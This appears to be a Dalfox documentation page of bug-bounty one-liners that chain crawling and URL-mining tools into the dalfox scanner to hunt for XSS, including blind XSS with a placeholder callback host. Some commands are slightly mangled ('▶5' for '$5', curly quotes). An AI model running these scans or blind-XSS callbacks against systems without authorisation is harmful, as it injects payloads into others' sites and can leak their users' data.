---
title: OneLiner
permalink: /docs/tips/oneliner/
---

> A fast, powerful, one-line

* Scanning XSS from host / from [@cihanmehmet in awesome-oneliner-bugbounty](https://github.com/dwisiswant0/awesome-oneliner-bugbounty)
```
▶ gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print ▶5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```
* [Automating XSS using Dalfox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75)
```
▶ cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```
* [Find XSS and Blind XSS, and send every request to burpsuite for more manual testing
](https://twitter.com/Alra3ees/status/1407058456323014659)
```
▶ dalfox file hosts --mining-dom  --deep-domxss --ignore-return -b 'YOURS.xss.ht' --follow-redirects --proxy http://127.0.0.1:8080
```
